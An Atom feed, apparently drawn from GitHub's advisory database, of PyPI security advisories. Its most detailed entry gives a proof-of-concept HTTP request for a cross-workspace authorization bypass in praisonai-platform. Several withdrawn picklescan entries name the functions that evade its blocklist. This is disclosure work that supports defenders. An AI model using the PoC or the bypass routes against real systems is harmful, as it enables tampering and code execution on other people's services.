<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-18T15:00:27.449Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Authorization Bypass Through User-Controlled Key]]></title>
        <id>https://github.com/advisories/GHSA-2fjj-qqg8-fg7x</id>
        <link href="https://github.com/advisories/GHSA-2fjj-qqg8-fg7x"/>
        <updated>2026-06-18T14:48:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The issue create and update endpoints in <code>praisonai-platform</code> accept a <code>project_id</code> in the request body and persist it without validating that the project belongs to the URL workspace. A user who is a member of workspace <code>W_B</code> (and has no access to workspace <code>W_A</code>) can create issues that reference a project owned by <code>W_A</code>. Because <code>ProjectService.get_stats()</code> aggregates issues by <code>project_id</code> with no workspace constraint, those foreign issues are then counted in the victim's own legitimate view of their project statistics. This is a cross-tenant integrity violation reachable by an outsider.</p>
<p>This is distinct from the path-parameter IDOR family fixed in 0.1.4 (CVE-2026-47415, CVE-2026-47418, CVE-2026-47419). Those fixes scoped object references supplied in the URL path. This report concerns an object reference supplied in the request body at write time, which the 0.1.4 fixes did not cover.</p>
<p>Version 0.1.4 fixed a set of path-parameter IDORs by threading <code>workspace_id</code> into the service-layer lookups (<code>get</code> / <code>update</code> / <code>delete</code>) and by adding the helpers <code>ensure_resource_in_workspace()</code> and <code>require_issue_in_workspace()</code> in <code>api/deps.py</code>. Those helpers are applied to object references that arrive in the URL path. They are not applied to object references that arrive in the request body on create or update.</p>
<h2 id="details">Details</h2>
<p><code>api/routes/issues.py</code>, <code>create_issue</code> passes the body's <code>project_id</code> straight through with no workspace validation:</p>
<pre><code class="language-python">@router.post("/", response_model=IssueResponse, status_code=201)
async def create_issue(workspace_id: str, body: IssueCreate,
                       user=Depends(require_workspace_member), session=Depends(get_db)):
    svc = IssueService(session)
    issue = await svc.create(
        workspace_id=workspace_id,
        title=body.title,
        creator_id=user.id,
        project_id=body.project_id,        # attacker-controlled, not validated against workspace_id
        ...
    )
</code></pre>
<p><code>services/issue_service.py</code>, <code>create</code> persists it as-is:</p>
<pre><code class="language-python">issue = Issue(
    workspace_id=workspace_id,
    project_id=project_id,                 # no check that project_id belongs to workspace_id
    ...
)
</code></pre>
<p><code>services/issue_service.py</code>, <code>update</code> has the identical gap on the update path:</p>
<pre><code class="language-python">if project_id is not None:
    issue.project_id = project_id          # re-parent to any project, no workspace check
</code></pre>
<p><code>services/project_service.py</code>, <code>get_stats</code> aggregates by <code>project_id</code> only:</p>
<pre><code class="language-python">async def get_stats(self, project_id: str) -&gt; dict:
    stmt = (
        select(Issue.status, func.count(Issue.id))
        .where(Issue.project_id == project_id)   # no workspace_id constraint
        .group_by(Issue.status)
    )
    ...
</code></pre>
<p>Note that the read path is not directly vulnerable. The stats route scopes the project first, so a cross-workspace stats read returns 404:</p>
<pre><code class="language-python">@router.get("/{project_id}/stats")
async def project_stats(workspace_id, project_id, user=Depends(require_workspace_member), ...):
    project = await svc.get(project_id, workspace_id=workspace_id)   # 404 for a foreign project
    if project is None:
        raise HTTPException(404, "Project not found")
    return await svc.get_stats(project_id)
</code></pre>
<p>The pollution therefore enters through the write side (issue create/update accepting a foreign <code>project_id</code>) and surfaces in the victim's own legitimate read of their project statistics.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Two unrelated users:</p>
<ul>
<li>Alice, member of workspace <code>W_A</code>, owns project <code>P_A</code>.</li>
<li>Bob, member of workspace <code>W_B</code> only. Bob has no access to <code>W_A</code> (every direct call to <code>W_A</code> resources returns 403).</li>
</ul>
<p>Steps:</p>
<ol>
<li><p>Alice's project <code>P_A</code> has one in-progress issue.
<code>GET /workspaces/W_A/projects/P_A/stats</code> returns <code>{"total": 1, "by_status": {"in_progress": 1}}</code>.</p>
</li>
<li><p>Bob creates issues in his own workspace that reference Alice's project. Repeat 7 times:</p>
<pre><code class="language-http">POST /workspaces/W_B/issues
Authorization: Bearer &lt;Bob's token&gt;
Content-Type: application/json

{"title": "x", "project_id": "P_A", "status": "done"}
</code></pre>
<p>Each returns 201. Each issue is stored with <code>workspace_id = W_B</code> and <code>project_id = P_A</code>.</p>
</li>
<li><p>Alice reads her own project stats:
<code>GET /workspaces/W_A/projects/P_A/stats</code> now returns
<code>{"total": 8, "by_status": {"done": 7, "in_progress": 1}}</code>.</p>
</li>
</ol>
<p>Bob is not a member of <code>W_A</code>, yet data he wrote appears in Alice's project dashboard.</p>
<h2 id="impact">Impact</h2>
<p>An unauthorized outsider can inflate or skew the issue counts shown in any workspace's project-statistics view, given only the target <code>project_id</code> (a UUID that can be harvested or guessed). The effect is limited to the statistics aggregation; it does not expose the victim's issue contents to the attacker and does not appear in the victim's workspace-scoped issue list. The same unvalidated write path also accepts cross-workspace <code>parent_issue_id</code> and <code>assignee_id</code> values, which have no aggregation read endpoint today but represent the same dangling cross-workspace reference class and should be fixed together.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>On both issue create and update, validate that any body-supplied object reference resolves within the URL workspace before persisting, reusing the existing pattern:</p>
<pre><code class="language-python">if body.project_id is not None:
    project = await ProjectService(session).get(body.project_id, workspace_id=workspace_id)
    if project is None:
        raise HTTPException(404, "Project not found")
</code></pre>
<p>Apply the same check to <code>parent_issue_id</code> (via <code>require_issue_in_workspace</code>) and to <code>assignee_id</code>. As defense in depth, scope <code>get_stats</code> so it only counts issues whose <code>workspace_id</code> matches the project's workspace.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2fjj-qqg8-fg7x">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2fjj-qqg8-fg7x</a></li>
<li><a href="https://github.com/advisories/GHSA-2fjj-qqg8-fg7x">https://github.com/advisories/GHSA-2fjj-qqg8-fg7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2fjj-qqg8-fg7x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T14:48:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: picklescan has Arbitrary file read using `io.FileIO` ]]></title>
        <id>https://github.com/advisories/GHSA-5v23-73v4-w2fp</id>
        <link href="https://github.com/advisories/GHSA-5v23-73v4-w2fp"/>
        <updated>2026-06-18T14:46:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-9726-w42j-3qjr. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.35 contains an unsafe pickle deserialization vulnerability allowing unauthenticated attackers to read arbitrary server files by chaining io.FileIO and urllib.request.urlopen. Attackers can bypass RCE-focused blocklists to exfiltrate sensitive data like /etc/passwd to external servers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9726-w42j-3qjr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9726-w42j-3qjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53872">https://nvd.nist.gov/vuln/detail/CVE-2026-53872</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-file-read-via-unsafe-pickle-deserialization">https://www.vulncheck.com/advisories/picklescan-arbitrary-file-read-via-unsafe-pickle-deserialization</a></li>
<li><a href="https://github.com/advisories/GHSA-5v23-73v4-w2fp">https://github.com/advisories/GHSA-5v23-73v4-w2fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5v23-73v4-w2fp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: PickleScan's pkgutil.resolve_name has a universal blocklist bypass]]></title>
        <id>https://github.com/advisories/GHSA-82fg-2r99-h7v6</id>
        <link href="https://github.com/advisories/GHSA-82fg-2r99-h7v6"/>
        <updated>2026-06-18T14:45:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-vvpj-8cmc-gx39. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 1.0.4 fails to block pkgutil.resolve_name, allowing attackers to bypass the entire blocklist by resolving any dangerous function through indirect REDUCE calls. Remote attackers can invoke any blocked function such as os.system, builtins.exec, or subprocess.call to achieve remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vvpj-8cmc-gx39">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vvpj-8cmc-gx39</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3490">https://nvd.nist.gov/vuln/detail/CVE-2026-3490</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-universal-blocklist-bypass-via-pkgutil-resolve-name">https://www.vulncheck.com/advisories/picklescan-universal-blocklist-bypass-via-pkgutil-resolve-name</a></li>
<li><a href="https://github.com/advisories/GHSA-82fg-2r99-h7v6">https://github.com/advisories/GHSA-82fg-2r99-h7v6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82fg-2r99-h7v6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan does not block ctypes]]></title>
        <id>https://github.com/advisories/GHSA-7f79-rvx6-vxc4</id>
        <link href="https://github.com/advisories/GHSA-7f79-rvx6-vxc4"/>
        <updated>2026-06-18T14:44:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-4675-36f9-wf6r. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.33 fails to block the ctypes module, allowing attackers to achieve remote code execution by invoking direct syscalls and accessing raw memory. Attackers can craft malicious pickle files using ctypes.WinDLL to load kernel32.dll and execute arbitrary commands, bypassing sandbox protections and gadget chain detection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4675-36f9-wf6r">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4675-36f9-wf6r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71323">https://nvd.nist.gov/vuln/detail/CVE-2025-71323</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-unblocked-ctypes-module">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-unblocked-ctypes-module</a></li>
<li><a href="https://github.com/advisories/GHSA-7f79-rvx6-vxc4">https://github.com/advisories/GHSA-7f79-rvx6-vxc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f79-rvx6-vxc4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan vulnerable to Arbitrary File Writing]]></title>
        <id>https://github.com/advisories/GHSA-rmpp-8wf5-xx5q</id>
        <link href="https://github.com/advisories/GHSA-rmpp-8wf5-xx5q"/>
        <updated>2026-06-18T14:44:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-m273-6v24-x4m4. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>picklescan before 0.0.33 contains an arbitrary file writing vulnerability that allows attackers to bypass the dangerous blocklist by using distutils.file_util.write_file. Attackers can construct malicious pickle objects to overwrite critical system files and achieve denial of service or remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71321">https://nvd.nist.gov/vuln/detail/CVE-2025-71321</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-file-writing-via-distutils-module-bypass">https://www.vulncheck.com/advisories/picklescan-arbitrary-file-writing-via-distutils-module-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-rmpp-8wf5-xx5q">https://github.com/advisories/GHSA-rmpp-8wf5-xx5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rmpp-8wf5-xx5q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan (scan_pytorch) Bypass via dynamic eval MAGIC_NUMBER]]></title>
        <id>https://github.com/advisories/GHSA-cc5p-54x3-hcf8</id>
        <link href="https://github.com/advisories/GHSA-cc5p-54x3-hcf8"/>
        <updated>2026-06-18T14:43:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-97f8-7cmv-76j2. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 1.0.3 contains a scanning bypass vulnerability in the scan_pytorch function that allows attackers to embed malicious magic numbers via dynamic eval using the <strong>reduce</strong> trick. Attackers can craft malicious PyTorch payloads that evade picklescan detection while remaining executable, enabling arbitrary code execution when loaded with torch.load().</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53875">https://nvd.nist.gov/vuln/detail/CVE-2026-53875</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/134179474539648ba7dee1317959529fbd0e7f89">https://github.com/mmaitre314/picklescan/commit/134179474539648ba7dee1317959529fbd0e7f89</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f">https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-scanning-bypass-via-dynamic-eval-in-scan-pytorch">https://www.vulncheck.com/advisories/picklescan-scanning-bypass-via-dynamic-eval-in-scan-pytorch</a></li>
<li><a href="https://github.com/advisories/GHSA-cc5p-54x3-hcf8">https://github.com/advisories/GHSA-cc5p-54x3-hcf8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc5p-54x3-hcf8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: PickleScan's profile.run blocklist mismatch allows exec() bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mpj-78p6-rj59</id>
        <link href="https://github.com/advisories/GHSA-4mpj-78p6-rj59"/>
        <updated>2026-06-18T14:43:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-7wx9-6375-f5wh. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 1.0.4 contains an incomplete blocklist for the profile module that fails to block the module-level profile.run() function, allowing attackers to achieve arbitrary code execution via exec(). Attackers can craft malicious pickle files calling profile.run(statement) to execute arbitrary Python code while picklescan reports zero security issues.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53873">https://nvd.nist.gov/vuln/detail/CVE-2026-53873</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-profile-run-blocklist-bypass">https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-profile-run-blocklist-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-4mpj-78p6-rj59">https://github.com/advisories/GHSA-4mpj-78p6-rj59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mpj-78p6-rj59</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: picklescan missing detection by simple obfuscation of a `builtins.eval` call]]></title>
        <id>https://github.com/advisories/GHSA-j6c9-qvp8-699f</id>
        <link href="https://github.com/advisories/GHSA-j6c9-qvp8-699f"/>
        <updated>2026-06-18T14:41:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-9m3x-qqw2-h32h. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 1.0.1 contains an unsafe deserialization vulnerability allowing unauthenticated users to execute arbitrary code by hiding eval calls nested under callable objects via getattr. Attackers can embed malicious code in pickle files that evades detection but executes when the pickle is loaded from untrusted sources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9m3x-qqw2-h32h">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9m3x-qqw2-h32h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53874">https://nvd.nist.gov/vuln/detail/CVE-2026-53874</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-obfuscated-eval-call">https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-obfuscated-eval-call</a></li>
<li><a href="https://github.com/advisories/GHSA-j6c9-qvp8-699f">https://github.com/advisories/GHSA-j6c9-qvp8-699f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6c9-qvp8-699f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan Bypasses Unsafe Globals Check using pty.spawn]]></title>
        <id>https://github.com/advisories/GHSA-5gp7-4733-2w2v</id>
        <link href="https://github.com/advisories/GHSA-5gp7-4733-2w2v"/>
        <updated>2026-06-18T14:41:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-hgrh-qx5j-jfwx. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>PickleScan before 0.0.33 fails to include the pty.spawn function in its unsafe globals list, allowing attackers to bypass security checks. Malicious actors can craft pickle payloads using pty.spawn to achieve arbitrary code execution when files are processed by PickleScan.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-hgrh-qx5j-jfwx">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-hgrh-qx5j-jfwx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71322">https://nvd.nist.gov/vuln/detail/CVE-2025-71322</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-unsafe-globals-check-bypass-via-pty-spawn-function">https://www.vulncheck.com/advisories/picklescan-unsafe-globals-check-bypass-via-pty-spawn-function</a></li>
<li><a href="https://github.com/advisories/GHSA-5gp7-4733-2w2v">https://github.com/advisories/GHSA-5gp7-4733-2w2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gp7-4733-2w2v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan has pickle parsing logic flaw that leads to malicious pickle file bypass]]></title>
        <id>https://github.com/advisories/GHSA-5rph-q42j-36j9</id>
        <link href="https://github.com/advisories/GHSA-5rph-q42j-36j9"/>
        <updated>2026-06-18T14:40:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-9gvj-pp9x-gcfr. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.27 contains a parsing logic error in the _list_globals function when handling STACK_GLOBAL opcodes, failing to track arguments in the correct range and allowing malicious pickle files to bypass detection. Attackers can craft pickle files with arguments at position zero to trigger unexpected exceptions and evade security scanning.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71325">https://nvd.nist.gov/vuln/detail/CVE-2025-71325</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f">https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-detection-bypass-via-stack-global-opcode-parsing-logic-flaw">https://www.vulncheck.com/advisories/picklescan-detection-bypass-via-stack-global-opcode-parsing-logic-flaw</a></li>
<li><a href="https://github.com/advisories/GHSA-5rph-q42j-36j9">https://github.com/advisories/GHSA-5rph-q42j-36j9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5rph-q42j-36j9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan has Incomplete List of Disallowed Inputs]]></title>
        <id>https://github.com/advisories/GHSA-6v84-v468-3c7f</id>
        <link href="https://github.com/advisories/GHSA-6v84-v468-3c7f"/>
        <updated>2026-06-18T14:40:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-84r2-jw7c-4r5q. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.33 contains an incomplete deny-list that fails to block pydoc.locate and operator.methodcaller functions, allowing attackers to bypass security checks. Remote attackers can craft malicious pickle files using these unblocked functions to achieve arbitrary code execution when the pickle is deserialized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71320">https://nvd.nist.gov/vuln/detail/CVE-2025-71320</a></li>
<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-incomplete-disallowed-inputs">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-incomplete-disallowed-inputs</a></li>
<li><a href="https://github.com/advisories/GHSA-6v84-v468-3c7f">https://github.com/advisories/GHSA-6v84-v468-3c7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v84-v468-3c7f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pdfkit] pdfkit: Path traversal in from_string]]></title>
        <id>https://github.com/advisories/GHSA-9g3x-6x24-vf9f</id>
        <link href="https://github.com/advisories/GHSA-9g3x-6x24-vf9f"/>
        <updated>2026-06-18T14:38:10.000Z</updated>
        <content type="html"><![CDATA[<p>In JazzCore python-pdfkit 1.0.0, the from_string method enables the execution of JavaScript code within the context of the server application and the exfiltration of local files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26240">https://nvd.nist.gov/vuln/detail/CVE-2025-26240</a></li>
<li><a href="https://habuon.github.io/2025/03/12/pdfkit-vulnerability-%28CVE-2025-26240%29.html">https://habuon.github.io/2025/03/12/pdfkit-vulnerability-%28CVE-2025-26240%29.html</a></li>
<li><a href="https://www.csirt.gov.sk/the-python-pdfkit-library-vulnerability.html">https://www.csirt.gov.sk/the-python-pdfkit-library-vulnerability.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9g3x-6x24-vf9f">https://github.com/advisories/GHSA-9g3x-6x24-vf9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9g3x-6x24-vf9f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[horizon] OpenStack Horizon RC file generation does not escape special characters in project names]]></title>
        <id>https://github.com/advisories/GHSA-6wrm-x65g-hr4p</id>
        <link href="https://github.com/advisories/GHSA-6wrm-x65g-hr4p"/>
        <updated>2026-06-18T14:37:29.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Horizon before 25.7.4 produces scripts for OpenStack RC file downloading that may have a crafted project name with shell metacharacters. NOTE: some parties consider this a security hardening opportunity to address certain types of user error, not a vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55748">https://nvd.nist.gov/vuln/detail/CVE-2026-55748</a></li>
<li><a href="https://launchpad.net/bugs/2152240">https://launchpad.net/bugs/2152240</a></li>
<li><a href="https://wiki.openstack.org/wiki/OSSN/OSSN-0097">https://wiki.openstack.org/wiki/OSSN/OSSN-0097</a></li>
<li><a href="https://github.com/advisories/GHSA-6wrm-x65g-hr4p">https://github.com/advisories/GHSA-6wrm-x65g-hr4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wrm-x65g-hr4p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-sftp] Apache Airflow SFTP provider: Path traversal in SFTPHook.retrieve_directory]]></title>
        <id>https://github.com/advisories/GHSA-qf38-jq28-3ccq</id>
        <link href="https://github.com/advisories/GHSA-qf38-jq28-3ccq"/>
        <updated>2026-06-18T14:35:05.000Z</updated>
        <content type="html"><![CDATA[<p>A path traversal in the SFTP provider (<code>SFTPHook.retrieve_directory</code> / <code>SFTPOperator(operation=get)</code>) let a malicious or compromised remote SFTP server write files outside the configured local destination directory via crafted directory-entry names. No Airflow account is required — the attack surface is any deployment downloading directories from an untrusted SFTP server. Upgrade <code>apache-airflow-providers-sftp</code> to 5.8.1 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50203">https://nvd.nist.gov/vuln/detail/CVE-2026-50203</a></li>
<li><a href="https://github.com/apache/airflow/pull/67985">https://github.com/apache/airflow/pull/67985</a></li>
<li><a href="https://lists.apache.org/thread/7f4b284oh44c1n95oq8mh1qc7y1lr9dx">https://lists.apache.org/thread/7f4b284oh44c1n95oq8mh1qc7y1lr9dx</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/16/3">http://www.openwall.com/lists/oss-security/2026/06/16/3</a></li>
<li><a href="https://github.com/advisories/GHSA-qf38-jq28-3ccq">https://github.com/advisories/GHSA-qf38-jq28-3ccq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qf38-jq28-3ccq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-17T18:35:51.000Z</published>
    </entry>
    <entry>
